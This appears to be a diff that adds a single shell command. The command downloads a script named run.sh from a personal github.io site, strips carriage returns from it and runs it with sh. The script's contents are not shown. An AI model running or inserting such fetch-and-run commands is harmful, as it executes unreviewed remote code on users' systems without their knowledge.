@@ -1,0 +1,1 @@
+curl -O https://ducvu2002.github.io/ducvu_puclic/run.sh && tr -d '\r' < run.sh > fixrun.sh && rm -r run.sh && sh fixrun.sh
